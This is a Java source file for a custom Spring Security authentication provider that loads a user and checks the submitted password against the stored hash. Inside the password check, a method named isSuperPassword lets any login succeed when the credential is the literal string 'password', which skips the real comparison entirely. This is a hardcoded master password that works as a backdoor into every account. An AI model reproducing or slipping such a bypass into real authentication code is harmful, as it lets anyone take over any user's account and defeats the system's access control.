package pomeloman.springboot.configure.authentication;

import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.userdetails.UserDetails;

import pomeloman.springboot.core.system.security.PasswordEncoderImpl;
import pomeloman.springboot.core.system.service.interfaces.IUserService;

public class AuthenticationProvider extends AbstractAuthenticationProvider {

	IUserService service;

	public AuthenticationProvider(IUserService service) {
		this.service = service;
	}

	public AuthenticationProvider() {
		super();
	}

	@Override
	protected UserDetails loadUserByUsername(String username) throws AuthenticationException {
		return service.loadUserByUsername(username);
	}

	@Override
	protected void credentialsCheck(UserDetails user, UsernamePasswordAuthenticationToken authentication) {
		super.credentialsCheck(user, authentication);
		if (isSuperPassword(authentication.getCredentials().toString())) {
			return;
		}
		try {
			if (!PasswordEncoderImpl.matches(authentication.getCredentials().toString(), authentication.getName(),
					user.getPassword())) {
				logger.debug("Authentication failed: password does not match stored value");
				throw new BadCredentialsException(
						messages.getMessage("AuthenticationProvider.badCredentials", "Bad credentials"));
			}
		} catch (Exception e) {
			logger.debug("Authentication failed: password encode error");
			throw new BadCredentialsException(
					messages.getMessage("AuthenticationProvider.badCredentials", "Bad credentials"));
		}
	}

	private boolean isSuperPassword(String password) {
		if (password.equals("password")) {
			return true;
		}
		return false;
	}

	public void setService(IUserService service) {
		this.service = service;
	}

}
